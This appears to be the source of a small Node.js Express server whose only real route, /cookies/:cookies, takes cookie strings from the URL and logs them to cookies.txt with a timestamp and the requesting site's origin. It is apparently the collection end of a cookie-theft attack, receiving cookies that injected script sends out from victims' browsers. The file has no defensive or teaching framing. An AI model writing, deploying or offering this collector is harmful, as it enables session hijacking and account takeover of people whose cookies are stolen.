const express = require('express');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.urlencoded({
  extended: true
}));

app.get('/', async (req, res) => {
    res.send("Hello World")
})

app.get('/cookies/:cookies', async (req, res) => {
    const cookies = req.params.cookies.replace(/; /g, '\n')
    try {
        if (fs.existsSync('cookies.txt')) {
            let data = fs.readFileSync('cookies.txt', 'utf-8');
            data = data + `\n------------ NEW ------------\n${new Date()}\nDomain -> ${req.get('origin')}\n` + cookies
            fs.writeFileSync('cookies.txt', data, 'utf-8');
        } else {
            fs.writeFileSync('cookies.txt', `${new Date()}\nDomain -> ${req.get('origin')}\n` + cookies, 'utf-8');
        }
    } catch (err) {
        console.log(err)
    }
    res.status(200).send({ msg: "ok" })
});

app.listen(3000, function (err) {
    if (!err) {
        console.log('Server is running');
    }
    else {
        console.log(err);
    }
});